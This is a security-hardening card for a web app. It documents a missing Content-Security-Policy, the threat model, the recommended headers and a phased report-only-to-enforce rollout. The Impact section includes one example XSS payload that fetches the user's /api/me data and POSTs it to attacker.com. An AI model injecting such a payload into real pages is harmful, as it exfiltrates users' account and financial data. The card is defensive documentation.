# C2 — Frontend SPA не має Content-Security-Policy

> **Last validated:** 2026-06-08 by @claude. **Next review:** 2026-09-06.
> **Status:** In progress — Phase 1 (Report-Only canary + sink + meta fallback) shipped 2026-05-04; Phase 2 side-by-side enforce-mode rolled out (Report-Only retained for regression tracking); awaiting 24h soak then 7-day clean window before removing Report-Only. **Update 2026-06-01:** the 7-day clean window has elapsed by calendar (enforce rolled out 2026-05-24); the only remaining step is to confirm zero `/api/csp-report` violations over that window, then drop the Report-Only header in a follow-up — operational, not code.

| Field              | Value                                                                                                   |
| ------------------ | ------------------------------------------------------------------------------------------------------- |
| **Severity**       | **Critical** (CVSS 8.8 — Universal-XSS exfiltration vector)                                             |
| **Sprint**         | [Sprint 1](./sprint-1.md)                                                                               |
| **Owner**          | frontend                                                                                                |
| **Effort**         | 0.5 person-day (Report-Only) + 1d опційно для Strict-CSP nonce-flow                                     |
| **Status**         | Phase 1 closed — frontend Report-Only canary live; Phase 2 (strict/enforce + nonce) tracked below       |
| **Discovered**     | 2026-05-03                                                                                              |
| **Threat model**   | XSS Exfiltration → Account Compromise                                                                   |
| **Affected files** | `apps/web/vercel.json`, `vercel.json` (root), `apps/web/index.html`, `apps/server/src/http/security.ts` |

## Summary

`helmet.contentSecurityPolicy` додає `Content-Security-Policy` header **тільки до response-ів API**. Це коректно для JSON-API. SPA-фронтенд (`apps/web`) тепер має Phase-1 `Content-Security-Policy-Report-Only` у `apps/web/vercel.json`, report sink `/api/csp-report`, і meta fallback у `apps/web/index.html`; ця картка лишається відкритою лише для strict/enforce CSP + nonce flow.

Це означає: будь-який майбутній XSS у SPA (через залежність, через user-content рендер у `claude-tracker` chat-message-і, через misconfigured library) → повний exfiltration без жодного браузерного guard-у.

## Historical evidence (before Phase 1)

```jsonc
// vercel.json (root) — є COOP/COEP/Permissions-Policy/X-Frame-Options, але НЕМАЄ CSP
[
  { "key": "Cross-Origin-Opener-Policy", "value": "same-origin" },
  { "key": "Cross-Origin-Embedder-Policy", "value": "require-corp" },
  {
    "key": "Permissions-Policy",
    "value": "camera=(), microphone=(), geolocation=()",
  },
  { "key": "X-Frame-Options", "value": "DENY" },
  // НЕМАЄ "Content-Security-Policy"
]
```

```html
<!-- apps/web/index.html — немає <meta http-equiv="Content-Security-Policy"> -->
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Sergeant</title>
<!-- ↑ після цього рядка одразу імпортується bundle -->
```

```ts
// apps/server/src/http/security.ts — CSP стоїть, але ТІЛЬКИ для API-response-ів
helmet({
  contentSecurityPolicy: { directives: { defaultSrc: ["'none'"], ... } },
  // ...
})
```

## Impact

1. **Universal-XSS exfiltration** — `<script>fetch("/api/me").then(r=>r.json()).then(s=>fetch("https://attacker.com",{method:"POST",body:JSON.stringify(s)}))</script>` — нічого не блокує.
2. **Sergeant обробляє фінансові дані** (Monobank, PrivatBank), персональні (вага, харчування, медичні замітки в `claude-tracker`). Без CSP `connect-src` обмеження браузер відправить будь-що куди завгодно.
3. **CSP — найдешевший single-shot захист від XSS**, який вже передбачений архітектурою (Vercel headers).
4. **Defense-in-depth gap** — навіть з добре написаним React-кодом, малий compromised dependency у вузькому supply-chain (наприклад, react-charting-library з 50K downloads/тиждень) запатчить себе у production без виявлення.

## Recommendation

### Phase 1 — CSP Report-Only (1–2 тижні)

Додати **`Content-Security-Policy-Report-Only`** з мінімально-обмежуючим policy-ом. Збирати reports через `report-uri` → `/api/csp-report` endpoint на сервері (вже існує — перевірити). Після стабілізації false-positive-ів (PostHog session-recording, Sentry trace, Vercel Analytics) → перейти у **enforce-mode**.

```json
{
  "key": "Content-Security-Policy-Report-Only",
  "value": "default-src 'self'; script-src 'self' 'wasm-unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: https:; font-src 'self' data:; connect-src 'self' https://api.<your-host> https://*.posthog.com https://*.ingest.sentry.io; frame-ancestors 'none'; base-uri 'none'; form-action 'self'; object-src 'none'; upgrade-insecure-requests; report-uri /api/csp-report"
}
```

### Phase 2 — Enforce + nonce (опційно)

- Викинути `'unsafe-inline'` для `style-src` після перевірки реальних source-map / Tailwind generated styles.
- Якщо Vite produces inline `<script>` blocks — додати `nonce` через build-time inject.
- Перевірити COEP-сумісність із Stripe/Google-Maps/PostHog session iframes.

### Defense-in-depth: meta-fallback

- Додати `<meta http-equiv="Content-Security-Policy" ...>` в `apps/web/index.html` як **fallback**, якщо Vercel headers не доїхали (rare edge-case).

## Correction points

| File                                                                     | Action                                                                                                                                           |
| ------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------ |
| `apps/web/vercel.json` (або root `vercel.json` — див. [H7](./README.md)) | Додати `Content-Security-Policy-Report-Only` header (Report-Only spec вище).                                                                     |
| `apps/web/index.html:39–42`                                              | Додати fallback `<meta http-equiv="Content-Security-Policy" content="..." />` (нижчий пріоритет за Vercel headers, але страхує).                 |
| `apps/server/src/modules/csp-report/router.ts` (новий або existing)      | Перевірити, що `/api/csp-report` приймає JSON body, валідує, rate-limit-ить, і логує у `csp_violation_total{directive=...}` метрику.             |
| `apps/web/public/.well-known/csp-violations` (тимчасовий)                | Додатковий sink для legacy reporters (можна skip-нути, якщо Sentry приймає `Reporting-API`).                                                     |
| `apps/server/src/http/security.ts`                                       | Якщо CSP_DISABLE / CSP_REPORT_ONLY env-flags використовуються — синхронізувати поведінку server-side helmet з frontend (див. [M1](./README.md)). |

## Verification

1. **CSP report endpoint smoke** — дати CSP-report curl-ом, переконатись, що він записується у метрику.
2. **Production canary** — деплой Report-Only mode → 24h моніторинг `csp_violation_total` → корекція allowlist.
3. **Browser DevTools** — Network tab → Response Headers → `Content-Security-Policy-Report-Only: ...` присутній на root-route і на assets.
4. **Penetration test (manual)** — спробувати inject inline `<script>alert(1)</script>` через chat-message render або через `?next=...` deeplink → CSP-report має фіксувати спробу.

## Open questions

- Чи **PostHog session-recording** компатибельний з `script-src 'self'`? Перевірити docs (deprecated COEP-вимоги).
- Чи **Stripe** використовується в frontend? Якщо так — `connect-src https://api.stripe.com https://m.stripe.com`, `frame-src https://js.stripe.com`, `script-src https://js.stripe.com`.
- Чи **Sentry session-replay** activated? Якщо так — окремі CSP-вимоги.
- Чи `'unsafe-eval'` потрібен для якоїсь wasm-залежності (Sentry profiling, image-codec, …)?

## Implementation log

| Date       | Event                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| ---------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 2026-05-03 | Card opened (Sprint 1).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| 2026-05-04 | **Phase 1 shipped**: <ul><li>`Content-Security-Policy-Report-Only` already live in root `vercel.json`; updated `report-uri` from the placeholder Sentry stub to the real sink at `https://api.sergeant.app/api/csp-report`.</li><li>Added `POST /api/csp-report` endpoint in `apps/server/src/routes/csp-report.ts` + handler in `apps/server/src/modules/observability/csp-report.ts`. Accepts both legacy (`application/csp-report`) and Reporting-API (`application/reports+json`) wire formats. Per-IP rate-limit 120/min via `rateLimitExpress`. 5% sample-log to Pino.</li><li>New Prometheus counter `csp_violation_total{directive,disposition}` in `apps/server/src/obs/metrics.ts`. Cardinality bounded to ≈75 series via directive allowlist + `other`/`unknown` bucket.</li><li>Added defense-in-depth `<meta http-equiv="Content-Security-Policy">` fallback in `apps/web/index.html` for non-Vercel render paths (`file://`, dev preview without headers).</li><li>Body-size policy: dedicated `express.json` mounts on `/api/csp-report` for both browser content-types, capped at 16 KB to match Sentry's CSP-ingest ceiling.</li><li>Test coverage: `apps/server/src/modules/observability/csp-report.test.ts` (7 tests — legacy envelope, bare report, Reporting-API array, unknown-directive bucketing, effective-directive precedence, malformed payload tolerance, empty array).</li></ul> |

### Phase 2 — still open

The Phase-1 canary needs a **24-hour soak** in production before flipping
the header from `Content-Security-Policy-Report-Only` to enforced
`Content-Security-Policy`. Track Phase-2 closure under this card after:

1. `csp_violation_total` rate stabilises in Grafana (no novel directive
   firing for 7 days on the production rollout).
2. Allowlist is tightened (drop `'unsafe-inline'` from `style-src`, audit
   `'wasm-unsafe-eval'` need against the wasm-using deps in the bundle).
3. Vite is configured to inject a per-request `nonce` for any inline
   `<script>` blocks that survive the build step.
4. PostHog session-replay / Sentry session-replay compatibility re-tested
   with strict CSP — see _Open questions_ below.

#### Phase 2 — research findings (2026-05-24)

Done as a planning pass before any code lands (no deps installed, no
deploy). Evidence in the repo, not assumptions.

**Inline `<script>` audit.** `apps/web/index.html` contains exactly one
`<script type="module" src="/src/main.tsx">` — external src, not inline,
covered by `script-src 'self'`. Vite 8 only injects inline `<script>` for
the legacy plugin (`@vitejs/plugin-legacy`), which is not in
`apps/web/package.json`. VitePWA uses `injectManifest` + `registerType:
"prompt"` and the SW is registered from `main.tsx` (line 294,
`import("virtual:pwa-register")`) — no inline shim in HTML. Sentry vite
plugin only injects a debug-id comment into bundles, not inline HTML.
**Conclusion:** the production HTML has no inline scripts today, so
`'unsafe-inline'` can be dropped from `script-src` immediately without a
nonce flow.

**`wasm-unsafe-eval` audit.** `@sqlite.org/sqlite-wasm` (`vendor-sqlite`
chunk) requires `WebAssembly.compile` on a streamed buffer — Chrome/Edge
gate this behind `script-src 'wasm-unsafe-eval'`. **Keep the directive.**

**`style-src 'unsafe-inline'` audit.** Tailwind v4 emits a single
external `.css` artifact in the production build, but runtime-injected
inline `<style>` blocks are likely from at least three sources in the
bundle: `@dnd-kit/core` (drag-overlay positioning), `react-virtuoso`
(viewport sizing) and `posthog-js`/Sentry-replay (overlay UI). A
nonce-or-hash style-src is the right answer, but Vite has no first-class
nonce hook — would require `index-html-transform` plugin work that
risks SW precache invalidation (sw hashes the transformed HTML). For
this phase, **keep `'unsafe-inline'` in `style-src`** and add a TODO
tracked separately; CSP-style XSS via inline `<style>` is far lower
impact than script XSS, and the W3C explicitly allows the split.

**Third-party CSP compatibility.**

- **Stripe** — only used via hosted Checkout/Billing-portal redirect
  (`window.location.href = session.url`); `js.stripe.com` is **not**
  loaded. No `frame-src`/`script-src` allowlist needed.
- **PostHog** — `autocapture: false`, no `session_recording` flag set
  (default off as of `posthog-js@1.372`). Only the script bundle and
  `connect-src https://*.posthog.com` are needed. **No `worker-src`
  blob: dependency** for analytics.
- **Sentry replay** (`replayIntegration` in
  `apps/web/src/core/observability/sentry.ts:313`) — requires
  `worker-src blob:` (already present) and `connect-src` to
  `*.ingest.sentry.io` (already present). Replay does not inject inline
  scripts; uses existing SDK bundle.

**Nonce strategy (deferred).** Vite does not expose a build-time
`script-nonce` plugin out of the box. The two viable options are
(a) `vite-plugin-csp-guard` (community, ~400 weekly downloads, MIT) —
hash-based, no per-request nonce, fits a CDN-cached SPA; or
(b) a custom `transformIndexHtml` plugin that emits a deterministic
build-time hash for each `<script>`. **Recommendation:** prefer (a)
_only if_ we re-introduce inline scripts; today's bundle does not need
either. The Phase-2 enforce policy can ship without a nonce flow.

**Proposed enforce policy (drop-in replacement for the Report-Only header
in root `vercel.json`, gated behind an env-driven `vercel.json` swap or a
hand-flip after the 24h soak).**

```json
{
  "key": "Content-Security-Policy",
  "value": "default-src 'self'; script-src 'self' 'wasm-unsafe-eval' https://*.posthog.com https://*.sentry-cdn.com https://*.sentry.io https://js.sentry-cdn.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: https:; font-src 'self' data:; connect-src 'self' https://*.sentry.io https://*.ingest.sentry.io https://*.posthog.com https://api.openclaw.com https://api.sergeant.app https://api.sergeantapp.com wss:; worker-src 'self' blob:; manifest-src 'self'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'; object-src 'none'; report-uri https://api.sergeant.app/api/csp-report; report-to csp-endpoint"
}
```

Diff vs Phase-1 Report-Only header:

- **Removed** `'unsafe-inline'` from `script-src` (audit above confirms
  no inline scripts in production HTML).
- **Removed** `http://localhost:3000` / `http://127.0.0.1:3000` from
  `connect-src` (dev-only — leaving them on a production enforce header
  is a needless allowlist surface).
- **Removed** `ws:` from `connect-src` (kept `wss:` only — production
  WebSocket must be TLS; `ws:` is a dev artefact).
- `style-src 'unsafe-inline'` retained (see audit above; tracked as
  separate follow-up).

**Rollout plan (no code change in this PR — planning only).**

1. Wait for ≥24h of Report-Only soak with the current header (already
   shipped 2026-05-04). Confirm `csp_violation_total{disposition="report"}`
   shows only known directives.
2. PR with both headers side-by-side: keep
   `Content-Security-Policy-Report-Only` (existing), add
   `Content-Security-Policy` (new, enforce). Browsers honour both
   simultaneously — `report-only` keeps logging, `enforce` starts
   blocking. This is the safest cutover (no env toggle needed; toggle
   is a `git revert` if anything fires).
3. Monitor for 24h: `csp_violation_total{disposition="enforce"}` must
   stay flat. If it spikes, revert the PR.
4. After 7 days clean, remove the Report-Only header in a follow-up PR.

**Status:** research complete, no code changed in this pass. The
side-by-side PR is unblocked and can land whenever the founder
confirms the soak window has passed.

#### Phase 2 — side-by-side enforce rolled out (2026-05-24)

Step 2 з rollout plan виконано: `apps/web/vercel.json` тепер emits
**both** `Content-Security-Policy-Report-Only` (existing, retained for
regression tracking) **and** `Content-Security-Policy` (new, enforce).
Browsers honour both simultaneously per W3C — Report-Only keeps logging,
enforce starts blocking. Cutover-safety: rollback = `git revert` single
PR.

Diff vs Phase-1 Report-Only header in the new enforce header:

- **Removed** `'unsafe-inline'` from `script-src` (audit above:
  `apps/web/index.html` has zero inline scripts; production HTML is
  external-only via `/src/main.tsx`).
- **Removed** `http://localhost:3000` / `http://127.0.0.1:3000` from
  `connect-src` (dev-only — needless allowlist surface in prod enforce).
- **Removed** `ws:` from `connect-src` (kept `wss:` — production
  WebSocket must be TLS; `ws:` is a dev artefact).
- `style-src 'unsafe-inline'` retained — tracked as separate follow-up
  (see audit; nonce-or-hash style-src needs Vite `transformIndexHtml`
  work that risks SW precache invalidation).

**Next steps (post-merge, sequential):**

1. **24h soak:** monitor `csp_violation_total{disposition="enforce"}`.
   Must stay flat. If it spikes — revert this PR immediately.
2. **7-day clean window:** if no novel directive fires for 7 days, open
   follow-up PR to remove the Report-Only header (the enforce header
   handles both blocking and reporting via the same `report-uri`).

## Cross-references

- [docs/04-governance/security/hardening/sprint-1.md](./sprint-1.md) — sprint context.
- [docs/04-governance/security/hardening/C1-mono-webhook-secret-in-url.md](./C1-mono-webhook-secret-in-url.md) — обидві Critical.
- [MDN: CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) — reference policy syntax.
- [OWASP Cheat Sheet: Content Security Policy](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html).
